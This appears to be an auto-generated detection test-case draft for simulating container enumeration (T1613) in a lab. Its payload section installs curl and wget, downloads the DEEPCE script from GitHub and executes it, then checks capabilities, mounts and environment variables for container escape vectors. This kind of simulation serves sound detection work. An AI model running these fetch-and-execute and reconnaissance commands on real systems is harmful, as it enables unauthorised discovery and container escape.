identity.name: Container Enumeration via DEEPCE
identity.summary: Auto-generated draft from CortexSim scenario SIM-CDR-001. Plane: CDR. Primary technique: T1613. Requires human enrichment of BIOC logic + panw_mapping rule_ids.
identity.description:
Auto-generated draft from CortexSim scenario SIM-CDR-001. Plane: CDR. Primary technique: T1613. Requires human enrichment of BIOC logic + panw_mapping rule_ids.

Source scenario: SIM-CDR-001.
UC: Container Runtime Threat Detection / TC: Container Enumeration and Discovery.

prerequisites.description: Lab environment matching scenario SIM-CDR-001 requirements.

payload.code:
# step-1: Install enumeration dependencies
apt-get update -qq && apt-get install -y --no-install-recommends curl wget 2>/dev/null || \
apk add --no-cache curl wget 2>/dev/null || \
yum install -y curl wget 2>/dev/null; \
echo "[*] Dependency install complete"
# step-2: Download and execute DEEPCE container enumeration tool
curl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt
# step-3: Check for privileged container escape vectors
ls -la /dev/ | head -30 && echo '---' && cat /proc/1/status | grep -E 'CapEff|CapPrm' && echo '---' && mount | grep -E 'overlay|docker|k8s' && echo '---' && env | grep -iE 'kube|docker|container'
